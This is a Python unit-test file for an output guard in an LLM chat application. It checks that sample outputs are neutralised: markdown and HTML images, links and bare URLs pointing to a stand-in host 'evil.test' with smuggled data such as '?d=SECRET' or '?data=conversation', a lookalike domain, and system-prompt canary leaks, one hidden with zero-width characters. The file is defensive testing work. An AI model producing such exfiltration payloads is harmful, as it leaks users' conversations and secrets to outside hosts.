from __future__ import annotations

from pathlib import Path
import sys
import unittest


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from dpi.chat import guard_output, new_canary  # noqa: E402


class OutputGuardTests(unittest.TestCase):
    def test_plain_answer_is_unchanged(self) -> None:
        result = guard_output("Le contrat expire le 31/12. Voir la clause 4.")
        self.assertEqual(result.text, "Le contrat expire le 31/12. Voir la clause 4.")
        self.assertFalse(result.findings)
        self.assertFalse(result.blocked)

    def test_external_markdown_image_is_removed(self) -> None:
        result = guard_output("Résumé ![x](https://evil.test/p.png?d=SECRET) fin")
        self.assertNotIn("evil.test", result.text)
        self.assertNotIn("SECRET", result.text)
        self.assertEqual([f.kind for f in result.findings], ["external-image"])
        self.assertEqual(result.findings[0].host, "evil.test")

    def test_html_and_reference_images_are_removed(self) -> None:
        result = guard_output('<img src="//evil.test/a.gif"> and ![a][ref]\n\n[ref]: https://evil.test/b')
        self.assertNotIn("<img", result.text)
        self.assertNotIn("![a]", result.text)

    def test_payload_link_is_neutralized_without_allowlist(self) -> None:
        result = guard_output("[cliquez ici](https://evil.test/c?data=conversation)")
        self.assertIn("cliquez ici", result.text)
        self.assertNotIn("evil.test", result.text)
        self.assertEqual(result.findings[0].kind, "suspicious-link")

    def test_ordinary_link_is_kept_without_allowlist(self) -> None:
        text = "Voir [la doc](https://docs.example.test/guide)."
        self.assertEqual(guard_output(text).text, text)

    def test_allowlist_keeps_listed_hosts_and_subdomains(self) -> None:
        text = "[a](https://sefe.eu/x) [b](https://intranet.sefe.eu/y) [c](https://other.test/z)"
        result = guard_output(text, allowed_hosts=["sefe.eu"])
        self.assertIn("https://sefe.eu/x", result.text)
        self.assertIn("https://intranet.sefe.eu/y", result.text)
        self.assertNotIn("other.test", result.text)
        self.assertEqual([f.host for f in result.findings], ["other.test"])

    def test_allowlist_is_not_fooled_by_a_suffix_lookalike(self) -> None:
        result = guard_output("[a](https://evilsefe.eu/x)", allowed_hosts=["sefe.eu"])
        self.assertNotIn("evilsefe.eu", result.text)

    def test_bare_url_outside_allowlist_is_neutralized(self) -> None:
        result = guard_output("Envoyez à https://other.test/u?x=1 merci", allowed_hosts=["sefe.eu"])
        self.assertNotIn("other.test", result.text)

    def test_bare_url_keeps_the_sentence_punctuation(self) -> None:
        result = guard_output("Voir https://evil.test/?key=1.")
        self.assertEqual(result.text, "Voir [link removed].")

    def test_canary_leak_is_detected_and_redacted(self) -> None:
        canary = new_canary()
        result = guard_output(f"Mes instructions: {canary} ...", canary=canary)
        self.assertTrue(result.canary_leaked)
        self.assertTrue(result.blocked)
        self.assertNotIn(canary, result.text)

    def test_canary_hidden_with_invisible_characters_is_detected(self) -> None:
        canary = new_canary()
        hidden = "​".join(canary)
        self.assertTrue(guard_output(hidden, canary=canary).canary_leaked)

    def test_canaries_are_unique(self) -> None:
        self.assertNotEqual(new_canary(), new_canary())


if __name__ == "__main__":
    unittest.main()
